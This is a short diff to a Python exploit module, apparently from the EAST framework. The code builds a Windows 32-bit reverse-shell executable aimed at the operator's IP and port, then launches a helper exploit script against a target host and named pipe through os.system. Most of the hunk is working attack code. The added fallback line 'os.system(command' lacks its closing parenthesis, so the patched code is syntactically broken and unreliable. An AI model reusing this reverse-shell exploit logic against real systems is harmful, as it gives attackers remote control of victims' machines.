@@ -818,16 +818,13 @@ class exploit(Sploit):
 		s = OSShellcodes("WINDOWS", "32bit", self.ip, self.portr)
 		shellcode_type = "reverse"
 		shellcode = s.create_shellcode(shellcode_type, make_exe=1,debug=1,filename="payloadEAST")
-#		shellcode = s.create_shellcode(shellcode_type,encode="rot_13", make_exe=1,debug=1,filename="payloadEAST")
+		#shellcode = s.create_shellcode(shellcode_type,encode="rot_13", make_exe=1,debug=1,filename="payloadEAST")
 		command = '/usr/bin/python /etc/EAST/help/scriptEAST.py {ip} {pipe}'.format(ip=self.host,pipe=self.pipe)
-		os.system(command)
-		"""
 		try:
-			command = 'python c:\\EAST\\help\\scriptEAST.py {ip} {pipe}'.format(ip=self.host,pipe=self.pipe)
 			os.system(command)
-		except Exception as e:
-			print(e)
-		"""
+		except:
+			command = "python c:\\EAST\\help\\scriptEAST.py {ip} {pipe}".format(ip=self.host,pipe=self.pipe)
+			os.system(command
 		self.log('Done')
 		self.finish(True)
 
